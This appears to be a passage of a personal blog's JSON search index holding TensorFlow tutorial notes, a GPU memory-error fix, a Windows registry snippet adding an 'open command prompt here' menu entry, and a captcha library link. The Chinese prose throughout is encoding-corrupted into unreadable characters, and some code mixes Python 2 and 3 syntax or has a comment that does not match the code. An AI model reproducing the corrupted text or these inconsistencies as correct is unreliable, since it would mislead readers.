tensorflow","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"twnsorflow GPU ç‰ˆæœ¬æŠ¥é”™ Blas GEMM launch failed","slug":"history/tech/5b10ed7233380aa24f1fc27d","date":"2018-05-31T18:53:38.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b10ed7233380aa24f1fc27d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b10ed7233380aa24f1fc27d/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯12InternalError (see above for traceback): Blas GEMM launch failed : a.shape=(10000, 784), b.shape=(784, 500), m=10000, n=500, k=784 [[Node: MatMul = MatMul[T=DT_FLOAT, transpose_a=false, transpose_b=false, _device=\"/job:localhost/replica:0/task:0/device:GPU:0\"](_arg_Placeholder_0_0/_11, Variable/read)]]åŸå› å¦‚æœä½ æ˜¯ä½¿ç”¨ GPU ç‰ˆ TensorFlow çš„è¯ï¼Œå¹¶ä¸”ä½ æƒ³åœ¨æ˜¾å¡é«˜å ç”¨ç‡çš„æƒ…å†µä¸‹ï¼ˆæ¯”å¦‚ç©æ¸¸æˆï¼‰è®­ç»ƒæ¨¡å‹ï¼Œé‚£ä½ è¦æ³¨æ„åœ¨åˆå§‹åŒ– Session çš„æ—¶å€™ä¸ºå…¶åˆ†é…å›ºå®šæ•°é‡çš„æ˜¾å­˜ï¼Œå¦åˆ™å¯èƒ½ä¼šåœ¨å¼€å§‹è®­ç»ƒçš„æ—¶å€™ç›´æ¥æŠ¥é”™é€€å‡ºè§£å†³æ–¹æ¡ˆï¼šéœ€è¦ç”¨ä¸‹é¢çš„æ–¹æ³•åˆ›å»º Sessionï¼š12gpu_options = tf.GPUOptions(per_process_gpu_memory_fraction=0.333) sess = tf.Session(config=tf.ConfigProto(gpu_options=gpu_options))å‚è€ƒèµ„æ–™:https://segmentfault.com/a/1190000009954640?utm_source=itdadao&amp;utm_medium=referral","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows å³é”® cmd","slug":"history/tech/5b10ea9a33380aa24f1fc27c","date":"2018-05-31T18:41:30.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b10ea9a33380aa24f1fc27c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b10ea9a33380aa24f1fc27c/","excerpt":"","text":"12345678910111213141516171819202122232425262728Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\cmd_here] @=&quot;åœ¨æ­¤å¤„æ‰“å¼€å‘½ä»¤è¡Œ&quot; &quot;Icon&quot;=&quot;cmd.exe&quot; [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\cmd_here\\command] @=&quot;\\&quot;C:\\\\Windows\\\\System32\\\\cmd.exe\\&quot;&quot; [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Folder\\shell\\cmdPrompt] @=&quot;åœ¨æ­¤å¤„æ‰“å¼€å‘½ä»¤è¡Œ&quot; [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Folder\\shell\\cmdPrompt\\command] @=&quot;\\&quot;C:\\\\Windows\\\\System32\\\\cmd.exe\\&quot; \\&quot;cd %1\\&quot;&quot; [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\shell\\cmd_here] @=&quot;åœ¨æ­¤å¤„æ‰“å¼€å‘½ä»¤è¡Œ&quot; &quot;Icon&quot;=&quot;cmd.exe&quot; [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\shell\\cmd_here\\command] @=&quot;\\&quot;C:\\\\Windows\\\\System32\\\\cmd.exe\\&quot;&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"TensorFlow ä¼˜åŒ–ç¬”è®°","slug":"history/tech/5b0fbc6d33380aa24f1fc27b","date":"2018-05-30T21:12:13.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0fbc6d33380aa24f1fc27b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0fbc6d33380aa24f1fc27b/","excerpt":"","text":"å­¦ä¹ ç‡12345678910111213141516171819import tensorflow as tfw = tf.Variable(tf.constant(5, dtype=tf.float32))loss = tf.square(w + 1)train_step = tf.train.GradientDescentOptimizer(1).minimize(loss)#train_step = tf.train.GradientDescentOptimizer(0.0001).minimize(loss)#train_step = tf.train.GradientDescentOptimizer(0.001).minimize(loss)with tf.Session() as sess: init = tf.initialize_all_variables() sess.run(init) for i in range(40): sess.run(train_step) loss_val = sess.run(loss) print(&quot;%s loss %f .&quot; % (i, loss_val))å­¦ä¹ ç‡å¤§äº†éœ‡è¡ä¸æ”¶æ•›ï¼Œå°äº†æ”¶æ•›é€Ÿåº¦æ…¢æŒ‡æ•°è¡°å‡å­¦ä¹ ç‡1234567891011121314151617181920212223242526import tensorflow as tfLEARNING_RATE_BASE = 0.1LEARNING_RATE_DECAY = 0.99LEARNING_RATE_STEP = 1global_step = tf.Variable(0, trainable=False)learning_rate = tf.train.exponential_decay(LEARNING_RATE_BASE, global_step, LEARNING_RATE_STEP, LEARNING_RATE_DECAY, staircase=True)w = tf.Variable(tf.constant(5, dtype=tf.float32))loss = tf.square(w + 1)train_step = tf.train.GradientDescentOptimizer(learning_rate).minimize(loss, global_step=global_step)with tf.Session() as sess: init = tf.initialize_all_variables() sess.run(init) for i in range(50): sess.run(train_step) learning_rate_val = sess.run(learning_rate) global_step_val = sess.run(global_step) w_val = sess.run(w) loss_val = sess.run(loss) print(learning_rate_val, global_step_val, w_val, loss_val)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"java éªŒè¯ç ç”Ÿæˆæ¨¡å—","slug":"history/tech/5b0e13c633380aa24f1fc274","date":"2018-05-30T03:00:22.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0e13c633380aa24f1fc274/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0e13c633380aa24f1fc274/","excerpt":"","text":"1https://code.google.com/archive/p/kaptcha/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"tensorflow ç¬”è®°2 æ­£åå‘ä¼ æ’­ç¥ç»ç½‘ç»œå°è®°","slug":"history/tech/5b0eb6c333380aa24f1fc279","date":"2018-05-30T02:35:47.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0eb6c333380aa24f1fc279/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0eb6c333380aa24f1fc279/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142import tensorflow as tfimport numpy as npBATCH_SIZE = 8seed = 23455rng = np.random.RandomState(seed)X = rng.rand(32, 2)Y = [[int(x0 + x1)] for (x0, x1) in X]print(&quot;X: \\n&quot;, X)print(&quot;Y: \\n&quot;, Y)x = tf.placeholder(tf.float32, shape=[None, 2])y_ = tf.placeholder(tf.float32, shape=[None, 1])w1 = tf.Variable(tf.random_normal([2, 3], stddev=1, seed=1))w2 = tf.Variable(tf.random_normal([3, 1], stddev=1, seed=1))a = tf.matmul(x, w1)y = tf.matmul(a, w2)# loss funcloss = tf.reduce_mean(tf.square(y - y_))train_step = tf.train.GradientDescentOptimizer(0.001).minimize(loss)with tf.Session() as sess: init_top = tf.global_variables_initializer() sess.run(init_top) print(&quot;w1:\\n&quot;, sess.run(w1)) print(&quot;w2:\\n&quot;, sess.run(w2)) print(&quot;\\n&quot;) SETPS = 3000 for i in range(SETPS): start = (i * BATCH_SIZE) % 32 end = start + BATCH_SIZE sess.run(train_step, feed_dict=&#123;x: X[start:end], y_: Y[start:end]&#125;) if i % 500 == 0: total_loss = sess.run(loss, feed_dict=&#123;x: X, y_: Y&#125;) print(&quot;After %d training step(s) ,loss on all data is %g &quot; % (i, total_loss)) print(&quot;\\n&quot;) print(&quot;w1:\\n&quot;, sess.run(w1)) print(&quot;w2:\\n&quot;, sess.run(w2))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"tensorflowæ·±åº¦å­¦ä¹ ","slug":"tensorflowæ·±åº¦å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/tensorflow%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"author":"baipeng"},{"title":"tensorflow ç¬”è®°","slug":"history/tech/5b0e611433380aa24f1fc276","date":"2018-05-29T20:30:12.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0e611433380aa24f1fc276/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0e611433380aa24f1fc276/","excerpt":"","text":"å®ç°åŠ æ³•:1234567#coding:utf-8import tensorflow as tf #å¼•å…¥æ¨¡å—a = tf.constant([1.0, 2.0]) #å®šä¹‰ä¸€ä¸ªå¼ é‡ç­‰äº[1.0,2.0]b = tf.constant([3.0, 4.0]) #å®šä¹‰ä¸€ä¸ªå¼ é‡ç­‰äº[3.0,4.0]result = a+b #å®ç° a åŠ  b çš„åŠ æ³•print (result) #æ‰“å°å‡ºç»“æœè¾“å‡ºç»“æœï¼š12C:\\Users\\wangxiuwen\\Desktop\\tensor&gt;python test.pyTensor(\"add:0\", shape=(2,), dtype=float32) å®ç°çŸ©é˜µä¹˜æ³•:1234567import tensorflow as tf #å¼•å…¥æ¨¡å—x = tf.constant([[1.0, 2.0]]) #å®šä¹‰ä¸€ä¸ª 2 é˜¶å¼ é‡ç­‰äº[[1.0,2.0]]w = tf.constant([[3.0], [4.0]]) #å®šä¹‰ä¸€ä¸ª 2 é˜¶å¼ é‡ç­‰äº[[3.0],[4.0]]y = tf.matmul(x, w) #å®ç° xw çŸ©é˜µä¹˜æ³•, æ ¹æ®çŸ©é˜µä¹˜æ³•çš„å®šä¹‰ï¼Œè¦æ±‚çŸ©é˜µAçš„åˆ—æ•°å’ŒçŸ©é˜µBçš„è¡Œæ•°ä¸€è‡´with tf.Session() as sess: print (sess.run(y)) æ„å»ºç¥ç»ç½‘ç»œ:12345678910111213141516171819202122232425#coding:utf-8import tensorflow as tfwith tf.device('/gpu:0'): x=tf.placeholder(tf.float32,shape=(None,2)) w1=tf.Variable(tf.random_normal([2,3],stddev=1,seed=1)) w2=tf.Variable(tf.random_normal([3,1],stddev=1,seed=1)) a=tf.matmul(x,w1) y=tf.matmul(a,w2) with tf.Session() as sess: init_op=tf.global_variables_initializer() sess.run(init_op) print(\"y is :\\n\", sess.run(y, feed_dict=&#123; x:[ [0.7, 0.5], [0.2, 0.3], [0.3, 0.4], [0.4, 0.5] ] &#125;) ) åå‘ä¼ æ’­:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#coding:utf-8#0å¯¼å…¥æ¨¡å—ï¼Œç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®é›†ã€‚import tensorflow as tfimport numpy as npimport datetimeBATCH_SIZE = 8SEED = 23455#åŸºäºseedäº§ç”Ÿéšæœºæ•°rdm = np.random.RandomState(SEED)#éšæœºæ•°è¿”å›32è¡Œ2åˆ—çš„çŸ©é˜µ è¡¨ç¤º32ç»„ ä½“ç§¯å’Œé‡é‡ ä½œä¸ºè¾“å…¥æ•°æ®é›†X = rdm.rand(32,2)#ä»Xè¿™ä¸ª32è¡Œ2åˆ—çš„çŸ©é˜µä¸­ å–å‡ºä¸€è¡Œ åˆ¤æ–­å¦‚æœå’Œå°äº1 ç»™Yèµ‹å€¼1 å¦‚æœå’Œä¸å°äº1 ç»™Yèµ‹å€¼0 #ä½œä¸ºè¾“å…¥æ•°æ®é›†çš„æ ‡ç­¾ï¼ˆæ­£ç¡®ç­”æ¡ˆï¼‰ Y_ = [[int(x0 + x1 &lt; 1)] for (x0, x1) in X]#1å®šä¹‰ç¥ç»ç½‘ç»œçš„è¾“å…¥ã€å‚æ•°å’Œè¾“å‡º,å®šä¹‰å‰å‘ä¼ æ’­è¿‡ç¨‹ã€‚x = tf.placeholder(tf.float32, shape=(None, 2))y_= tf.placeholder(tf.float32, shape=(None, 1))w1= tf.Variable(tf.random_normal([2, 3], stddev=1, seed=1))w2= tf.Variable(tf.random_normal([3, 1], stddev=1, seed=1))a = tf.matmul(x, w1)y = tf.matmul(a, w2)#2å®šä¹‰æŸå¤±å‡½æ•°åŠåå‘ä¼ æ’­æ–¹æ³•ã€‚loss_mse = tf.reduce_mean(tf.square(y-y_)) train_step = tf.train.GradientDescentOptimizer(0.001).minimize(loss_mse)#train_step = tf.train.MomentumOptimizer(0.001,0.9).minimize(loss_mse)#train_step = tf.train.AdamOptimizer(0.001).minimize(loss_mse)#3ç”Ÿæˆä¼šè¯ï¼Œè®­ç»ƒSTEPSè½®with tf.Session() as sess: starttime = datetime.datetime.now() init_op = tf.global_variables_initializer() sess.run(init_op) # è¾“å‡ºç›®å‰ï¼ˆæœªç»è®­ç»ƒï¼‰çš„å‚æ•°å–å€¼ã€‚ print (\"w1:\\n\", sess.run(w1)) print (\"w2:\\n\", sess.run(w2)) print (\"\\n\") # è®­ç»ƒæ¨¡å‹ã€‚ STEPS = 20001 for i in range(STEPS): start = (i*BATCH_SIZE) % 32 end = start + BATCH_SIZE sess.run(train_step, feed_dict=&#123;x: X[start:end], y_: Y_[start:end]&#125;) if i % 2000 == 0: total_loss = sess.run(loss_mse, feed_dict=&#123;x: X, y_: Y_&#125;) print(\"After %d training step(s), loss_mse on all data is %g\" % (i, total_loss)) # è¾“å‡ºè®­ç»ƒåçš„å‚æ•°å–å€¼ã€‚ print (\"\\n\") print (\"w1:\\n\", sess.run(w1)) print (\"w2:\\n\", sess.run(w2)) endtime = datetime.datetime.now() interval=(endtime - starttime).seconds print(\"interval: \", interval)è¾“å‡ºç»“æœï¼š12345678w1: [[-0.69053286 0.8059843 0.0969111 ] [-2.3437088 -0.10367863 0.58519495]]w2: [[-0.08949634] [ 0.8059557 ] [-0.05076383]]After 18000 training step(s), loss_mse on all data is 0.383561 è‡ªå®šä¹‰æŸå¤±å‡½æ•°:12345678910111213141516171819202122232425262728293031323334353637383940#coding:utf-8#é…¸å¥¶æˆæœ¬9å…ƒï¼Œ é…¸å¥¶åˆ©æ¶¦1å…ƒ#é¢„æµ‹å¤šäº†æŸå¤±å¤§ï¼Œæ•…ä¸è¦é¢„æµ‹å¤šï¼Œæ•…ç”Ÿæˆçš„æ¨¡å‹ä¼šå°‘é¢„æµ‹ä¸€äº›#0å¯¼å…¥æ¨¡å—ï¼Œç”Ÿæˆæ•°æ®é›†import tensorflow as tfimport numpy as npBATCH_SIZE = 8SEED = 23455COST = 9PROFIT = 1rdm = np.random.RandomState(SEED)X = rdm.rand(32,2)Y = [[x1+x2+(rdm.rand()/10.0-0.05)] for (x1, x2) in X]#1å®šä¹‰ç¥ç»ç½‘ç»œçš„è¾“å…¥ã€å‚æ•°å’Œè¾“å‡ºï¼Œå®šä¹‰å‰å‘ä¼ æ’­è¿‡ç¨‹ã€‚x = tf.placeholder(tf.float32, shape=(None, 2))y_ = tf.placeholder(tf.float32, shape=(None, 1))w1= tf.Variable(tf.random_normal([2, 1], stddev=1, seed=1))y = tf.matmul(x, w1)#2å®šä¹‰æŸå¤±å‡½æ•°åŠåå‘ä¼ æ’­æ–¹æ³•ã€‚#é‡æ–°å®šä¹‰æŸå¤±å‡½æ•°ï¼Œä½¿å¾—é¢„æµ‹å¤šäº†çš„æŸå¤±å¤§ï¼Œäºæ˜¯æ¨¡å‹åº”è¯¥åå‘å°‘çš„æ–¹å‘é¢„æµ‹ã€‚loss = tf.reduce_sum(tf.where(tf.greater(y, y_), (y - y_)*COST, (y_ - y)*PROFIT))train_step = tf.train.GradientDescentOptimizer(0.001).minimize(loss)#3ç”Ÿæˆä¼šè¯ï¼Œè®­ç»ƒSTEPSè½®ã€‚with tf.Session() as sess: init_op = tf.global_variables_initializer() sess.run(init_op) STEPS = 3000 for i in range(STEPS): start = (i*BATCH_SIZE) % 32 end = (i*BATCH_SIZE) % 32 + BATCH_SIZE sess.run(train_step, feed_dict=&#123;x: X[start:end], y_: Y[start:end]&#125;) if i % 500 == 0: print \"After %d training steps, w1 is: \" % (i) print sess.run(w1), \"\\n\" print \"Final w1 is: \\n\", sess.run(w1) å¯è¡°å‡çš„å­¦ä¹ ç‡:123456789101112131415161718192021222324252627282930#coding:utf-8#è®¾æŸå¤±å‡½æ•° loss=(w+1)^2, ä»¤wåˆå€¼æ˜¯å¸¸æ•°10ã€‚åå‘ä¼ æ’­å°±æ˜¯æ±‚æœ€ä¼˜wï¼Œå³æ±‚æœ€å°losså¯¹åº”çš„wå€¼#ä½¿ç”¨æŒ‡æ•°è¡°å‡çš„å­¦ä¹ ç‡ï¼Œåœ¨è¿­ä»£åˆæœŸå¾—åˆ°è¾ƒé«˜çš„ä¸‹é™é€Ÿåº¦ï¼Œå¯ä»¥åœ¨è¾ƒå°çš„è®­ç»ƒè½®æ•°ä¸‹å–å¾—æ›´æœ‰æ”¶æ•›åº¦ã€‚import tensorflow as tfLEARNING_RATE_BASE = 0.1 #æœ€åˆå­¦ä¹ ç‡LEARNING_RATE_DECAY = 0.99 #å­¦ä¹ ç‡è¡°å‡ç‡LEARNING_RATE_STEP = 1 #å–‚å…¥å¤šå°‘è½®BATCH_SIZEåï¼Œæ›´æ–°ä¸€æ¬¡å­¦ä¹ ç‡ï¼Œä¸€èˆ¬è®¾ä¸ºï¼šæ€»æ ·æœ¬æ•°/BATCH_SIZE#è¿è¡Œäº†å‡ è½®BATCH_SIZEçš„è®¡æ•°å™¨ï¼Œåˆå€¼ç»™0, è®¾ä¸ºä¸è¢«è®­ç»ƒglobal_step = tf.Variable(0, trainable=False)#å®šä¹‰æŒ‡æ•°ä¸‹é™å­¦ä¹ ç‡learning_rate = tf.train.exponential_decay(LEARNING_RATE_BASE, global_step, LEARNING_RATE_STEP, LEARNING_RATE_DECAY, staircase=True)#å®šä¹‰å¾…ä¼˜åŒ–å‚æ•°ï¼Œåˆå€¼ç»™10w = tf.Variable(tf.constant(5, dtype=tf.float32))#å®šä¹‰æŸå¤±å‡½æ•°lossloss = tf.square(w+1)#å®šä¹‰åå‘ä¼ æ’­æ–¹æ³•train_step = tf.train.GradientDescentOptimizer(learning_rate).minimize(loss, global_step=global_step)#ç”Ÿæˆä¼šè¯ï¼Œè®­ç»ƒ40è½®with tf.Session() as sess: init_op=tf.global_variables_initializer() sess.run(init_op) for i in range(40): sess.run(train_step) learning_rate_val = sess.run(learning_rate) global_step_val = sess.run(global_step) w_val = sess.run(w) loss_val = sess.run(loss) print (\"After %s steps: global_step is %f, w is %f, learning rate is %f, loss is %f\" % (i, global_step_val, w_val, learning_rate_val, loss_val)) æ»‘åŠ¨å¹³å‡(å½±å­):1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8import tensorflow as tf#1. å®šä¹‰å˜é‡åŠæ»‘åŠ¨å¹³å‡ç±»#å®šä¹‰ä¸€ä¸ª32ä½æµ®ç‚¹å˜é‡ï¼Œåˆå§‹å€¼ä¸º0.0 è¿™ä¸ªä»£ç å°±æ˜¯ä¸æ–­æ›´æ–°w1å‚æ•°ï¼Œä¼˜åŒ–w1å‚æ•°ï¼Œæ»‘åŠ¨å¹³å‡åšäº†ä¸ªw1çš„å½±å­w1 = tf.Variable(0, dtype=tf.float32)#å®šä¹‰num_updatesï¼ˆNNçš„è¿­ä»£è½®æ•°ï¼‰,åˆå§‹å€¼ä¸º0ï¼Œä¸å¯è¢«ä¼˜åŒ–ï¼ˆè®­ç»ƒï¼‰ï¼Œè¿™ä¸ªå‚æ•°ä¸è®­ç»ƒglobal_step = tf.Variable(0, trainable=False)#å®ä¾‹åŒ–æ»‘åŠ¨å¹³å‡ç±»ï¼Œç»™è¡°å‡ç‡ä¸º0.99ï¼Œå½“å‰è½®æ•°global_stepMOVING_AVERAGE_DECAY = 0.99ema = tf.train.ExponentialMovingAverage(MOVING_AVERAGE_DECAY, global_step)#ema.applyåçš„æ‹¬å·é‡Œæ˜¯æ›´æ–°åˆ—è¡¨ï¼Œæ¯æ¬¡è¿è¡Œsess.runï¼ˆema_opï¼‰æ—¶ï¼Œå¯¹æ›´æ–°åˆ—è¡¨ä¸­çš„å…ƒç´ æ±‚æ»‘åŠ¨å¹³å‡å€¼ã€‚#åœ¨å®é™…åº”ç”¨ä¸­ä¼šä½¿ç”¨tf.trainable_variables()è‡ªåŠ¨å°†æ‰€æœ‰å¾…è®­ç»ƒçš„å‚æ•°æ±‡æ€»ä¸ºåˆ—è¡¨#ema_op = ema.apply([w1])ema_op = ema.apply(tf.trainable_variables())#2. æŸ¥çœ‹ä¸åŒè¿­ä»£ä¸­å˜é‡å–å€¼çš„å˜åŒ–ã€‚with tf.Session() as sess: # åˆå§‹åŒ– init_op = tf.global_variables_initializer() sess.run(init_op) #ç”¨ema.average(w1)è·å–w1æ»‘åŠ¨å¹³å‡å€¼ ï¼ˆè¦è¿è¡Œå¤šä¸ªèŠ‚ç‚¹ï¼Œä½œä¸ºåˆ—è¡¨ä¸­çš„å…ƒç´ åˆ—å‡ºï¼Œå†™åœ¨sess.runä¸­ï¼‰ #æ‰“å°å‡ºå½“å‰å‚æ•°w1å’Œw1æ»‘åŠ¨å¹³å‡å€¼ print( \"current global_step:\", sess.run(global_step)) print( \"current w1\", sess.run([w1, ema.average(w1)])) # å‚æ•°w1çš„å€¼èµ‹ä¸º1 sess.run(tf.assign(w1, 1)) sess.run(ema_op) print( \"current global_step:\", sess.run(global_step)) print( \"current w1\", sess.run([w1, ema.average(w1)])) # æ›´æ–°global_stepå’Œw1çš„å€¼,æ¨¡æ‹Ÿå‡ºè½®æ•°ä¸º100æ—¶ï¼Œå‚æ•°w1å˜ä¸º10, ä»¥ä¸‹ä»£ç global_stepä¿æŒä¸º100ï¼Œæ¯æ¬¡æ‰§è¡Œæ»‘åŠ¨å¹³å‡æ“ä½œï¼Œå½±å­å€¼ä¼šæ›´æ–° sess.run(tf.assign(global_step, 100)) sess.run(tf.assign(w1, 10)) sess.run(ema_op) print( \"current global_step:\", sess.run(global_step)) print( \"current w1:\", sess.run([w1, ema.average(w1)])) # æ¯æ¬¡sess.runä¼šæ›´æ–°ä¸€æ¬¡w1çš„æ»‘åŠ¨å¹³å‡å€¼ sess.run(ema_op) print( \"current global_step:\" , sess.run(global_step)) print( \"current w1:\", sess.run([w1, ema.average(w1)])) sess.run(ema_op) print( \"current global_step:\" , sess.run(global_step)) print( \"current w1:\", sess.run([w1, ema.average(w1)])) sess.run(ema_op) print( \"current global_step:\" , sess.run(global_step)) print( \"current w1:\", sess.run([w1, ema.average(w1)])) sess.run(ema_op) print( \"current global_step:\" , sess.run(global_step)) print( \"current w1:\", sess.run([w1, ema.average(w1)])) sess.run(ema_op) print( \"current global_step:\" , sess.run(global_step)) print( \"current w1:\", sess.run([w1, ema.average(w1)])) sess.run(ema_op) print( \"current global_step:\" , sess.run(global_step)) print( \"current w1:\", sess.run([w1, ema.average(w1)]))#æ›´æ”¹ MOVING_AVERAGE_DECAY ä¸º 0.1 çœ‹å½±å­è¿½éšé€Ÿåº¦ æ­£åˆ™åŒ–:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#coding:utf-8#0å¯¼å…¥æ¨¡å— ï¼Œç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®é›†import tensorflow as tfimport numpy as npimport matplotlib.pyplot as pltBATCH_SIZE = 30 seed = 2 #åŸºäºseedäº§ç”Ÿéšæœºæ•°rdm = np.random.RandomState(seed)#éšæœºæ•°è¿”å›300è¡Œ2åˆ—çš„çŸ©é˜µï¼Œè¡¨ç¤º300ç»„åæ ‡ç‚¹ï¼ˆx0,x1ï¼‰ä½œä¸ºè¾“å…¥æ•°æ®é›†X = rdm.randn(300,2)#ä»Xè¿™ä¸ª300è¡Œ2åˆ—çš„çŸ©é˜µä¸­å–å‡ºä¸€è¡Œ,åˆ¤æ–­å¦‚æœä¸¤ä¸ªåæ ‡çš„å¹³æ–¹å’Œå°äº2ï¼Œç»™Yèµ‹å€¼1ï¼Œå…¶ä½™èµ‹å€¼0#ä½œä¸ºè¾“å…¥æ•°æ®é›†çš„æ ‡ç­¾ï¼ˆæ­£ç¡®ç­”æ¡ˆï¼‰Y_ = [int(x0*x0 + x1*x1 &lt;2) for (x0,x1) in X]#éå†Yä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œ1èµ‹å€¼'red'å…¶ä½™èµ‹å€¼'blue'ï¼Œè¿™æ ·å¯è§†åŒ–æ˜¾ç¤ºæ—¶äººå¯ä»¥ç›´è§‚åŒºåˆ†Y_c = [['red' if y else 'blue'] for y in Y_]#å¯¹æ•°æ®é›†Xå’Œæ ‡ç­¾Yè¿›è¡Œshapeæ•´ç†ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸º-1è¡¨ç¤ºï¼Œéšç¬¬äºŒä¸ªå‚æ•°è®¡ç®—å¾—åˆ°ï¼Œç¬¬äºŒä¸ªå…ƒç´ è¡¨ç¤ºå¤šå°‘åˆ—ï¼ŒæŠŠXæ•´ç†ä¸ºnè¡Œ2åˆ—ï¼ŒæŠŠYæ•´ç†ä¸ºnè¡Œ1åˆ—X = np.vstack(X).reshape(-1,2)Y_ = np.vstack(Y_).reshape(-1,1)print( X)print( Y_)print( Y_c)#ç”¨plt.scatterç”»å‡ºæ•°æ®é›†Xå„è¡Œä¸­ç¬¬0åˆ—å…ƒç´ å’Œç¬¬1åˆ—å…ƒç´ çš„ç‚¹å³å„è¡Œçš„ï¼ˆx0ï¼Œx1ï¼‰ï¼Œç”¨å„è¡ŒY_cå¯¹åº”çš„å€¼è¡¨ç¤ºé¢œè‰²ï¼ˆcæ˜¯colorçš„ç¼©å†™ï¼‰ plt.scatter(X[:,0], X[:,1], c=np.squeeze(Y_c)) plt.show()#å®šä¹‰ç¥ç»ç½‘ç»œçš„è¾“å…¥ã€å‚æ•°å’Œè¾“å‡ºï¼Œå®šä¹‰å‰å‘ä¼ æ’­è¿‡ç¨‹ def get_weight(shape, regularizer): w = tf.Variable(tf.random_normal(shape), dtype=tf.float32) tf.add_to_collection('losses', tf.contrib.layers.l2_regularizer(regularizer)(w)) return wdef get_bias(shape): b = tf.Variable(tf.constant(0.01, shape=shape)) return b x = tf.placeholder(tf.float32, shape=(None, 2))y_ = tf.placeholder(tf.float32, shape=(None, 1))w1 = get_weight([2,11], 0.01) b1 = get_bias([11])y1 = tf.nn.relu(tf.matmul(x, w1)+b1)w2 = get_weight([11,1], 0.01)b2 = get_bias([1])y = tf.matmul(y1, w2)+b2 #å®šä¹‰æŸå¤±å‡½æ•°loss_mse = tf.reduce_mean(tf.square(y-y_))loss_total = loss_mse + tf.add_n(tf.get_collection('losses'))#å®šä¹‰åå‘ä¼ æ’­æ–¹æ³•ï¼šä¸å«æ­£åˆ™åŒ–train_step = tf.train.AdamOptimizer(0.0001).minimize(loss_mse)with tf.Session() as sess: init_op = tf.global_variables_initializer() sess.run(init_op) STEPS = 40000 for i in range(STEPS): start = (i*BATCH_SIZE) % 300 end = start + BATCH_SIZE sess.run(train_step, feed_dict=&#123;x:X[start:end], y_:Y_[start:end]&#125;) if i % 2000 == 0: loss_mse_v = sess.run(loss_mse, feed_dict=&#123;x:X, y_:Y_&#125;) print((\"After %d steps, loss is: %f\" %(i, loss_mse_v))) 